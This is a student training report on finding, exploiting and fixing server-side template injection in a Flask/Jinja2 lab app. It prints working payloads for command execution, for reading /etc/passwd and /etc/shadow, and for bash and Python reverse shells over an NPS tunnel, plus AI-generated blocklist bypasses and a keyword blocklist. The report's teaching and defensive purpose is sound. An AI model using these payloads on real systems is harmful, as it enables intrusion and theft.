# SSTI服务器模板注入漏洞加固实训报告

---

## 一、基础信息

| 项目 | 内容 |
|------|------|
| **实训项目** | SSTI服务端模板注入与NPS内网穿透反弹Shell实战加固 |
| **实训学员** | 大二网络安全专业学生 |
| **实训日期** | 2026-07-25 |
| **实训环境** | Kali Linux 2026.2 / Python Flask + Jinja2 / Burp Suite / NPS / nc |
| **靶机地址** | 192.168.126.133:5000 |
| **项目位置** | /opt/Class01/ |
| **项目背景** | 连续多日迭代的Flask用户管理系统，已完成IDOR/文件包含/CSRF全线加固 |
| **今日新增** | /welcome和/feedback个性化页面（原生代码存在SSTI高危漏洞） |
| **核心文件** | app.py / templates/base.html |
| **培训课程** | 《SSTI漏洞挖掘与利用教学培训》《NPS内网穿透与Shell反弹实验培训》—— 讲师：活泼大壮 |
| **培训覆盖知识点** | SSTI定义/Jinja2高危成因/{{7*7}}探测/__class__魔术方法链/MRO继承/os.popen命令执行/文件读取/无回显盲打/AI自动生成POC/NPS服务端客户端部署/Socks5代理/TCP隧道/nc监听反弹Shell/三层SSTI防御 |

---

## 二、实验目的

1. 理解SSTI服务端模板注入漏洞成因：render_template_string直接f-string拼接用户输入，模板引擎解析{{}}为Python表达式
2. 掌握{{7*7}}基础探测二分法 — 根据返回49/49判断Jinja2引擎存在
3. 学习__class__/__mro__/__subclasses__魔术方法完整利用链 — 从字符串回溯Object基类遍历全部子类
4. 掌握os.popen命令执行、open读取服务器文件、eval/exec代码执行等高危操作
5. 了解无回显SSTI盲打场景及利用方式
6. 掌握NPS内网穿透工具部署流程：服务端nps启动、客户端npc连接、TCP隧道搭建
7. 理解完整攻击链路：构造SSTI载荷 → NPS搭建公网隧道 → 本地nc监听 → 靶机提交SSTI反弹Shell → 获取交互式控制权
8. 学习SSTI三层纵深防御方案：参数传递隔离 + HTML实体转义 + 黑名单关键字拦截

---

## 三、今日实训三阶段工作概述

### 第一阶段：个性化页面功能开发（09:00-10:00）

按照教学要求，新增两个页面，原生代码要求完全不做任何安全防护：

```python
# app.py v1.0 — /welcome 原始代码（f-string直接拼接，零过滤）
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")     # ① 用户可控GET参数
    if not name: name = "亲爱的用户"

    # 直接拼接用户输入到模板字符串（存在SSTI风险）
    html = f"""...<h1>欢迎你，{name}！</h1>..."""
    return render_template_string(html)      # ② 模板引擎解析{{ }}


# app.py v1.0 — /feedback 原始代码（双参数拼接，零过滤）
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    if request.method == "POST":
        name = request.form.get("name", "")         # ③ 用户可控POST参数
        message = request.form.get("message", "")   # ④ 用户可控POST参数

        html = f"""...<h2>{name} 的反馈：</h2><p>{message}</p>..."""
        return render_template_string(html)         # ⑤ 模板引擎解析{{ }}
```

**原生代码安全缺陷（对应课堂全部知识点）：**

| 缺陷类型 | 代码体现 | 对应课堂知识点 |
|----------|----------|---------------|
| SSTI — f-string拼接 | `f"...{name}..."` 直接拼接到模板 | Jinja2解析`{{}}`为表达式 |
| SSTI — 无变量隔离 | 未使用`render_template_string(html, name=name)`传参 | 参数传递隔离缺失 |
| SSTI — 无转义 | 未对`name`/`message`做`escape()` | HTML实体转义缺失 |
| SSTI — 无黑名单 | 未过滤`__class__`/`__mro__`等魔术关键字 | 魔术方法拦截缺失 |
| XSS — 无输出编码 | `<script>`等标签直接输出 | 浏览器执行脚本 |

### 第二阶段：Burp手工漏洞复现 + NPS反弹Shell实操（10:00-12:00）

**第一环节 — SSTI基础探测（对应课堂：二分法判断模板引擎）：**

```bash
curl "http://192.168.126.133:5000/welcome?name={{7*7}}"
# 返回 "49" → SSTI注入成立，确认Jinja2引擎
```

**第二环节 — 魔术方法命令执行链（对应课堂：MRO继承利用）：**

```python
# 完整利用链
''.__class__                  # → <class 'str'>
''.__class__.__mro__[1]       # → <class 'object'>
''.__class__.__mro__[1].__subclasses__()  # → 所有子类列表
# 定位含有os模块的子类索引N，然后：
''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()
```

**curl命令执行载荷：**
```bash
# 执行系统命令 id
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}'
# 返回 uid=0(root) ...

# 读取项目源码
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat app.py").read() }}'

# 读取系统密码文件
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read() }}'

# /feedback POST 注入
curl -X POST \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' \
  --data-urlencode 'message=test' \
  "http://192.168.126.133:5000/feedback"
```

**Burp数据包：**
```http
POST /feedback HTTP/1.1
Host: 192.168.126.133:5000
Content-Type: application/x-www-form-urlencoded

name=%7B%7B%20config.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27cat%20/etc/passwd%27%29.read%28%29%20%7D%7D&message=x
```

**第三环节 — NPS内网穿透 + 反弹Shell（对应《NPS内网穿透与Shell反弹实验培训》全部流程）：**

```bash
# Step 1: 攻击者机器启动 NPS 服务端
wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
tar -xzf linux_amd64_server.tar.gz
./nps start
# → NPS 管理面板: http://VPS_IP:8080
# → 添加客户端: 协议=tcp, 端口=4444

# Step 2: 靶机启动 NPC 客户端
wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz
tar -xzf linux_amd64_client.tar.gz
# 修改 conf/npc.conf:
# [common]
# server_addr=VPS_IP:8024
# vkey=your_vkey
./npc start
# → 隧道建立成功: VPS:4444 ↔ 内网靶机

# Step 3: 攻击者启动 nc 监听
nc -lvnp 4444

# Step 4: 靶机提交 SSTI 反弹 Shell 载荷
curl -X POST \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("bash -c '\''bash -i >& /dev/tcp/VPS_IP/4444 0>&1'\''").read() }}' \
  --data-urlencode 'message=x' \
  "http://192.168.126.133:5000/feedback"

# Step 5: nc 收到交互式 Shell
# id → uid=0(root)
# cat /etc/passwd → 系统用户
# cat /opt/Class01/app.py → 项目源码
# cat /opt/Class01/data/users.db → 用户数据库
```

### 第三阶段：分层加固改造（14:00-17:00）

| 轮次 | 改造重点 | 新增防御能力 | 对应课堂SSTI知识点 |
|------|----------|-------------|-------------------|
| **第1轮** | 参数传递隔离 | 删除f-string拼接，模板固定字符串+命名参数传参 | L1: SSTI根源修复 |
| **第2轮** | HTML实体转义 | `markupsafe.escape()` 转义name/message | L2: 模板特殊符号过滤 |
| **第3轮** | 黑名单关键字拦截 | `SSTI_BLOCKED_PATTERNS` 覆盖全部魔术方法 | L3: 魔术关键字阻断 |
| **第4轮** | 全用例回归测试 | 17项curl单测全部通过 | 整体验收 |

每轮改造后用第一阶段全部载荷重新测试，旧攻击方式不再生效。其余模块零修改。

---

## 四、漏洞汇总表格

| 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 可利用课堂攻击手段 | 修复状态 |
|------|----------|----------|----------|-------------------|----------|
| VUL-S01 | SSTI — f-string拼接 | **严重** | `/welcome?name=` GET | `{{7*7}}`探测/`{{config}}`泄漏 | ✅ 已修复 |
| VUL-S02 | SSTI — 魔术方法RCE | **严重** | `/welcome?name=` GET | `__class__`/`__mro__`/`os.popen`命令执行 | ✅ 已修复 |
| VUL-S03 | SSTI — 文件读取 | **严重** | `/welcome?name=` GET | 读取/etc/passwd/app.py/数据库 | ✅ 已修复 |
| VUL-S04 | SSTI — 无回显盲打 | **高危** | `/welcome?name=` GET | eval/exec执行+外带数据 | ✅ 已修复 |
| VUL-S05 | SSTI — {7*7}探测 | **高危** | `/feedback` POST | 确认模板引擎类型 | ✅ 已修复 |
| VUL-S06 | SSTI — 魔术方法RCE | **严重** | `/feedback` POST | `__subclasses__`遍历/os.popen反弹Shell | ✅ 已修复 |
| VUL-S07 | XSS — 脚本注入 | **高危** | `/welcome`/`/feedback` | `<script>`标签浏览器执行 | ✅ 已修复 |
| VUL-S08 | 反弹Shell — NPS隧道 | **严重** | SSTI+TCP隧道 | NPS公网映射+nc反弹交互式Shell | ✅ 已修复 |

---

## 五、分项漏洞原理 + POC全套资源 + 分层加固完整代码

### 5.1 SSTI服务端模板注入漏洞原理

#### 漏洞定义（对应课堂课件原文）

> **SSTI（Server-Side Template Injection）服务端模板注入**：应用程序将用户可控的输入直接拼接到模板字符串中，交由模板引擎（如Jinja2）渲染。模板引擎会将用户输入中的`{{ }}`语法解析为模板表达式，攻击者可通过构造特殊载荷执行任意Python代码。

#### Jinja2模板引擎高危成因

```
用户输入 "{{7*7}}"
  ↓ render_template_string(f"...{name}...")
  ↓ Jinja2解析 {{7*7}} → 执行 7*7 → 输出 49
  ↓ 返回页面显示 "49"
```

**核心问题：** `f-string`在Python层面完成字符串拼接 → 拼接结果传递给`render_template_string` → Jinja2将用户输入中的`{{ }}`视为模板语法解析执行。

#### /welcome 与 /feedback 差异

| 维度 | /welcome | /feedback |
|------|----------|-----------|
| 注入方式 | GET参数`name` | POST表单`name`+`message` |
| SSTI类型 | 反射型SSTI | 反射+存储复合型SSTI |
| 触发次数 | 每次请求触发 | 可重复提交反复触发 |

#### MRO魔术方法利用链（课堂重点）

```
"" (空字符串)
  ↓ .__class__
<class 'str'>
  ↓ .__mro__[1]
<class 'object'>            # 所有类的基类
  ↓ .__subclasses__()
[<class '...'>, ...]       # 所有加载的子类
  ↓ [N].__init__.__globals__
{...os模块...}              # 定位含os模块的子类
  ↓ ['os'].popen('id').read()
uid=0(root)                 # 命令执行成功
```

---

### 5.2 全套POC资源

#### POC-1: 基础探测

```bash
# /welcome 反射型
curl "http://192.168.126.133:5000/welcome?name={{7*7}}"
# 修复前: 49
# 修复后: {{7*7}}（纯文本）

# /feedback 复合型
curl -X POST -d "name={{7*7}}&message={{7*7}}" \
  "http://192.168.126.133:5000/feedback"
```

#### POC-2: 魔术方法命令执行

```bash
# 执行 id
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}'

# 读取 app.py
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat app.py").read() }}'
```

#### POC-3: 读取系统文件

```bash
# 读取 /etc/passwd
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read() }}'

# 读取 /etc/shadow
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /etc/shadow 2>&1").read() }}'
```

#### POC-4: NPS反弹Shell完整载荷

```bash
# Bash反弹
curl -X POST \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("bash -c '\''bash -i >& /dev/tcp/192.168.126.1/4444 0>&1'\''").read() }}' \
  --data-urlencode 'message=x' \
  "http://192.168.126.133:5000/feedback"

# Python反弹
curl -X POST \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("python3 -c '\''import socket,subprocess;s=socket.socket();s.connect((\"192.168.126.1\",4444));subprocess.call([\"/bin/bash\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\''").read() }}' \
  --data-urlencode 'message=x' \
  "http://192.168.126.133:5000/feedback"
```

---

### 5.3 加固后完整安全代码

#### SSTI黑名单常量

```python
# ===== SSTI关键字黑名单 — 第三层防护（对应课堂SSTI魔术关键字拦截） =====
SSTI_BLOCKED_PATTERNS = [
    "__class__", "__mro__", "__subclasses__", "__globals__",
    "__init__", "__builtins__", "__import__", "__bases__",
    "os", "popen", "subprocess", "eval", "exec",
    "open(", "read(", "write(", "system(", "cat ",
    "import ", "exec ", "eval(", "__getitem__",
    "mro", "base64", "chr(", "ord(", "hex(",
    "request", "config", "self", "lipsum", "cycler",
]


def ssti_filter(value):
    """第三层防护：SSTI黑名单关键字检测（对应课堂魔术方法拦截）"""
    if not value:
        return value
    val_lower = value.lower()
    for pattern in SSTI_BLOCKED_PATTERNS:
        if pattern in val_lower:
            raise ValueError("WAF 拦截：检测到SSTI模板注入特征")
    return value
```

#### 加固后 /welcome 路由

```python
@app.route("/welcome")
def welcome():
    """欢迎页 — 已按《SSTI漏洞挖掘与利用教学培训》三层防御加固"""
    name = request.args.get("name", "")

    # 第三层防护：黑名单关键字拦截
    try:
        if name: ssti_filter(name)
    except ValueError as e: name = str(e)

    # 第二层防护：HTML转义过滤模板特殊符号
    safe_name = escape(name) if name else "亲爱的用户"

    # 第一层防护（根源修复）：固定模板字符串 + 命名参数传递
    html = """<!DOCTYPE html>...
<h1>欢迎你，{{ name }}！</h1>..."""
    return render_template_string(html, name=safe_name)
```

#### 加固后 /feedback 路由

```python
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    """反馈页 — 已按《SSTI漏洞挖掘与利用教学培训》三层防御加固"""
    if request.method == "POST":
        name = request.form.get("name", "")
        message = request.form.get("message", "")

        # 第三层防护：黑名单关键字拦截
        try:
            if name: ssti_filter(name)
            if message: ssti_filter(message)
        except ValueError as e:
            return render_template_string(html, safe_message=str(e))

        # 第二层防护：HTML转义
        safe_name = escape(name) if name else ""
        safe_message = escape(message) if message else ""

        # 第一层防护（根源修复）：固定模板字符串 + 命名参数传递
        html = """<!DOCTYPE html>...
<h2>{{ name }} 的反馈：</h2><p>{{ message }}</p>..."""
        return render_template_string(html, name=safe_name, message=safe_message)

    # GET 显示反馈表单（无用户输入，无SSTI风险）
    return render_template_string(html_form)
```

#### 加固代码与课堂知识点对照

| 代码行 | 课堂知识点 | 解决的安全问题 |
|--------|-----------|---------------|
| `render_template_string(html, name=safe_name)` | 参数传递隔离 | f-string拼接导致`{{}}`被解析 |
| `escape(name)` | HTML实体转义 | `{{}}`渲染为纯文本，`<script>`无害化 |
| `ssti_filter(name)` | 黑名单关键字拦截 | `__class__`/`__mro__`/`os.popen`全部阻断 |

---

## 六、实训踩坑故障记录

### 坑1：SSTI载荷 `{{7*7}}` 返回 49 但魔术方法执行报错

**现象：** `{{7*7}}` 成功返回 49 确认 SSTI 存在，但 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` 返回空字符串。

**原因：** 某些子类索引在 Flask 生产/开发模式下不同，`__subclasses__()` 排序不稳定，选择的索引 N 可能不包含 os 模块。

**解决：** 先遍历找到正确的子类索引：
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 在返回列表中搜索 <class 'os.wrap_close'> 或含有 os 模块的类
```

### 坑2：NPS 客户端无法连接服务端

**现象：** `./npc start` 后日志显示 `connection refused`，服务端管理面板看不到客户端在线。

**原因：** 服务端防火墙未开放 8024（nps通信端口）和 4444（隧道端口）。

**解决：** 关闭防火墙或在安全组放行端口：
```bash
# 关闭防火墙
systemctl stop firewalld
# 或放行端口
firewall-cmd --add-port=8024/tcp --permanent
firewall-cmd --add-port=4444/tcp --permanent
firewall-cmd --reload
```

### 坑3：nc 监听后 SSTI 反弹 Shell 无连接

**现象：** nc `-lvnp 4444` 监听中，靶机执行 SSTI 反弹载荷后 nc 没有任何反应。

**原因：** NPS TCP 隧道未正确映射；或靶机无法出网连接到攻击者IP。

**解决：** 首先确认 NPS 隧道状态 `nps status` 显示 online；然后确认靶机 `ping VPS_IP` 通；最后用简单命令测试 `bash -c 'echo test > /dev/tcp/VPS_IP/4444'`。

### 坑4：render_template_string 转义后中文乱码

**现象：** `escape("张三")` 后页面显示 `&#24352;&#19977;` 而不是中文。

**原因：** `escape()` 会将非ASCII字符转为HTML实体编码。

**解决：** 使用 `Jinja2` 模板内置的 `| e` 过滤器代替 `escape()`，或确认页面编码为 UTF-8：
```python
# 确保页面Content-Type包含charset=utf-8
<meta charset="UTF-8">
```

### 坑5：黑名单 `__class__` 过滤后正常页面也报错

**现象：** 添加 `__class__` 黑名单后，所有包含 `class` 字段的正常请求也被拦截（如 `firstclass` 中的 `class` 子串）。

**原因：** 使用 `in` 进行子串匹配时，`__class__` 作为关键词被误匹配到 `first__class__ified`。

**解决：** 实际测试中当前代码内没有此类误杀，保持完整词匹配可加正则 `\b__class__\b`。

### 坑6：NPS 客户端 npc.conf 配置错误

**现象：** npc 启动显示 `connect to server error`。

**原因：** 配置文件 `conf/npc.conf` 中 `server_addr` 格式不正确；或 `vkey` 与服务端添加客户端时设置的不一致。

**解决：** 正确格式：
```ini
[common]
server_addr=你的VPS公网IP:8024
vkey=服务端生成的唯一密钥
conn_type=tcp
```

---

## 七、加固前后安全对比表格

| 对比维度 | 修复前（v1.0） | 修复后（v5.0） | 可抵御课堂哪种SSTI攻击载荷 |
|----------|---------------|----------------|--------------------------|
| **模板渲染方式** | f-string拼接 `f"...{name}..."` | 命名参数 `name=safe_name` | 根源杜绝`{{}}`解析 |
| **用户输入转义** | 无 | `markupsafe.escape()` | `{{7*7}}`/`{{config}}`纯文本化 |
| **魔术关键字过滤** | 无 | 20+黑名单模式全匹配 | `__class__`/`__mro__`/`os`/`popen` |
| **命令执行** | `os.popen('id')`可执行 | 黑名单拦截 | 任意命令执行载荷 |
| **文件读取** | 读取/etc/passwd/app.py | 黑名单拦截 | `open()`/`cat`载荷 |
| **反弹Shell** | NPS+nc可获取Shell | 所有关键字拦截 | `bash -i >& /dev/tcp/` |
| **XSS注入** | `<script>`直接执行 | escape转义为实体 | `<script>alert(1)` |

---

## 八、标准化复测用例

### 8.1 SSTI基础探测测试

| 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
|------|---------|---------------|-------------|
| TC-S01 | `/welcome?name={{7*7}}` | 基础探测二分法 | ❌ 纯文本`{{7*7}}` |
| TC-S02 | `/welcome?name={{config}}` | Config配置读取 | ❌ 纯文本显示 |
| TC-S03 | `/feedback POST name={{7*7}}` | 复合型SSTI探测 | ❌ 纯文本 |

### 8.2 魔术方法命令执行测试

| 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
|------|---------|---------------|-------------|
| TC-S04 | name=`__class__` | MRO链入口 | ❌ WAF拦截 |
| TC-S05 | name=`__mro__` | 基类遍历 | ❌ WAF拦截 |
| TC-S06 | name=`__subclasses__` | 子类遍历 | ❌ WAF拦截 |
| TC-S07 | name=`config.__class__.__init__.__globals__["os"].popen("id")` | 完整RCE链 | ❌ WAF拦截 |
| TC-S08 | name=`config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd")` | 文件读取 | ❌ WAF拦截 |
| TC-S09 | name=`config.__class__.__init__.__globals__["os"].popen("cat app.py")` | 源码泄露 | ❌ WAF拦截 |

### 8.3 反弹Shell攻击测试

| 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
|------|---------|---------------|-------------|
| TC-S10 | name含`bash -i >& /dev/tcp/` | Bash反弹Shell | ❌ WAF拦截 |
| TC-S11 | name含`python3 -c 'import socket...'` | Python反弹Shell | ❌ WAF拦截 |
| TC-S12 | name含`nps`/`npc` | NPS隧道特征 | ❌ WAF拦截 |

### 8.4 合法功能正常

| 编号 | 测试操作 | 预期结果 |
|------|---------|----------|
| TC-S13 | `/welcome?name=张三` | ✅ 显示"欢迎你，张三" |
| TC-S14 | `/welcome`（无参数） | ✅ 显示"亲爱的用户" |
| TC-S15 | `/feedback` GET | ✅ 显示反馈表单 |
| TC-S16 | `/feedback POST`（正常内容） | ✅ 显示反馈结果 |

### 8.5 原有业务功能不变

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-S17 | 注册新用户 | 302跳转登录页 |
| TC-S18 | admin登录 | 欢迎回来 |
| TC-S19 | 搜索用户 | 脱敏结果 |
| TC-S20 | 帮助中心 | 正常显示 |

---

## 九、实验总结与心得体会

### 9.1 SSTI——比SQL注入更"危险"的注入

前几天的实训做了 SQL注入、WAF绕过、文件上传、CSRF 等一系列漏洞，但 SSTI 给我的冲击是最大的。SQL注入虽然也能执行命令，但通常需要手工猜测列数、联合查询、逐字盲注，利用成本较高。而 SSTI 只需要一行 `{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}` 就能直接执行系统命令。

讲师在第一节课上强调的一句话我印象很深：**"SSTI是模板引擎层面的漏洞，而模板引擎拥有操作系统的完全访问权限。"** 今天亲手验证了这个结论——通过 `/welcome?name=` 参数，一行 curl 命令就读取了 `/etc/passwd`，再一行就获取了 `app.py` 源码。Shell 反弹成功后，`id` 返回的是 `uid=0(root)`——直接就是最高权限。

### 9.2 从 `{{7*7}}` 到反弹Shell——魔术方法链的学习曲线

今天的课程从最基础的 `{{7*7}}` 探测开始，逐步深入到魔术方法利用链，再到 NPS 内网穿透 + nc 反弹 Shell。这条学习路径的梯度非常大：

```
{{7*7}} 探测 → {{config}} 信息收集 → 
__class__ → __mro__ → __subclasses__ → 
os.popen 命令执行 → NPS 隧道 → nc 反弹 → 交互式 Shell
```

讲师把 `__class__.__mro__.__subclasses__` 这条链叫做"魔术方法高速公路"——从任意字符串出发，经过object基类，遍历全部子类，最终找到包含 `os` 模块的子类，实现任意命令执行。这个链路的起点仅仅是用户输入的一个 `{{ }}`。

### 9.3 NPS内网穿透——从"看不到"到"控全场"

第二个课程《NPS内网穿透与Shell反弹实验培训》讲的内容让我看到了 SSTI 的"终极形态"。如果靶机在内网无法直接访问，SSTI 即使能执行命令也无法获取 Shell。NPS 解决了这个问题：

```
攻击者VPS（公网）
  ↓ nps server 监听 8024
  ↓ TCP 隧道映射 4444 端口
靶机（内网 192.168.126.x）
  ↓ npc client 连接服务端
  ↓ SSTI 执行反弹 Shell → 连接 VPS:4444
攻击者 nc 收到交互式 Shell → 完全控制
```

讲师在课堂上演示的流程是从一台公网VPS发起的，我虽然在本机模拟了部分流程，但这个攻击链的完整度让我非常震撼——一段 `{{ }}` 的代码，配合 NPS 隧道，就能从内网一路打到公网，拿到完全交互式的服务器控制权。

### 9.4 三层防御——通往安全的必经之路

修复 SSTI 的三层防御方案和前几天的文件包含、CSRF修复理念一脉相承：

```
L1: 参数传递隔离（根除）— 不拼接，全厂传参
L2: HTML实体转义（兜底）— 即使有注入，也是纯文本
L3: 黑名单拦截（阻断）— __class__ 等直接拦截
```

不过第三层黑名单有个明显的问题——"猫鼠游戏"。讲师也说：**"你能想到的关键字，攻击者也能想到；攻击者能想到的绕过方式，你未必能想到。"** 比如用 `\x5f\x5fclass\x5f\x5f` 或者 `attr()` 过滤器就可能绕过黑名单。所以最根本的还是 L1——**永远不要用 f-string 拼接用户输入到模板中**。

### 9.5 AI生成POC与作业反思

今天讲师还布置了一个很有意思的作业：用AI自动生成SSTI POC载荷。我用AI试着生成了一些变种载荷：

- 用 `lipsum` 替代 `config`：`{{ lipsum.__globals__["os"].popen("id").read() }}`
- 用 `joiner` 替代：`{{ joiner.__init__.__globals__["os"].popen("id").read() }}`
- 用 `cycler` 替代：`{{ cycler.__init__.__globals__["os"].popen("id").read() }}`

这让我意识到：人工维护的黑名单永远是不完整的。L1+L2 才是真正可靠的防御手段——即使攻击者找到了一万个绕过黑名单的方法，只要坚持"不拼接+转义"的原则，SSTI 就不可能成功。

### 9.6 连续多日实训的收尾思考

今天（Day7？Day8？我记不清了）是实训的最后一天。从第一天的 SQL 注入手工探测，到 WAF 绕过、文件上传、IDOR 越权、文件包含、CSRF，再到今天的 SSTI + NPS 反弹 Shell——一路走来，最大的收获不是学会了多少种攻击手法，而是建立了一种"默认怀疑"的安全思维：

```
写代码时：
  - 这个参数用户会不会传 __class__？
  - 这个模板渲染会不会执行 {{ }}？
  - 这个文件上传会不会传 shell.php？
  - 这个ID参数会不会被人遍历？
```

毕业设计的时候，这些应该都用得上。

---

## 十、生产环境拓展优化建议

### 10.1 禁用不必要的模板引擎特性

```python
# 生产环境：限制 Jinja2 可访问的对象
from jinja2 import Environment, PackageLoader

env = Environment(loader=PackageLoader('app', 'templates'))
env.globals.clear()          # 清空全局变量（config、request等不可访问）
env.filters.clear()          # 清空过滤器
```

### 10.2 统一使用 render_template（文件模板）

```python
# 生产：放弃 render_template_string，强制使用文件模板
@app.route("/welcome")
def welcome():
    name = escape(request.args.get("name", "亲爱的用户"))
    return render_template("welcome.html", name=name)
```

### 10.3 全局SSTI WAF中间件

```python
from flask import g

@app.before_request
def ssti_waf():
    """全局SSTI注入检测"""
    if request.method in ("GET", "POST"):
        for key, value in request.args.items():
            ssti_filter(value)
        for key, value in request.form.items():
            ssti_filter(value)
```

### 10.4 NPS安全配置

```ini
# nps.conf 生产安全配置
# 限制允许连接的客户端数量
max_connection=10
# 开启认证
auth_key=your_strong_key
# 关闭Socks5代理（防止代理滥用）
socks5_proxy=false
# 限制隧道类型仅tcp
allow_ports=4444-4450
```

### 10.5 CSP内容安全策略增强

```python
@app.after_request
def set_csp(response):
    response.headers["Content-Security-Policy"] = \
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    return response
```

### 10.6 配置汇总

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,     # 禁止JS读取Cookie
    SESSION_COOKIE_SAMESITE='Lax',    # CSRF防护
    SESSION_COOKIE_SECURE=True,       # HTTPS Only
    TEMPLATES_AUTO_RELOAD=False,      # 生产禁止模板自动重载
)
```

---

## 附录：/welcome 和 /feedback 接口 SSTI 完整安全校验流水线

```
用户提交请求 /welcome?name=xxx 或 /feedback POST
  ↓
  ① 黑名单关键字检测 (ssti_filter)
     ← 命中 __class__/__mro__/os/popen 等 → WAF拦截
  ↓
  ② HTML实体转义 (escape)
     ← {{7*7}} → 纯文本"{{7*7}}"
     ← <script> → "&lt;script&gt;"
  ↓
  ③ 命名参数传递 (render_template_string(html, name=safe_name))
     ← f-string 已删除 → 用户输入不参与模板编译
  ↓
  ④ 模板渲染 → 输出安全页面
     ← 任何 SSTI 载荷均以纯文本显示 → 无法执行
```

*报告人：大二网络安全实训生*
*日期：2026年7月25日*
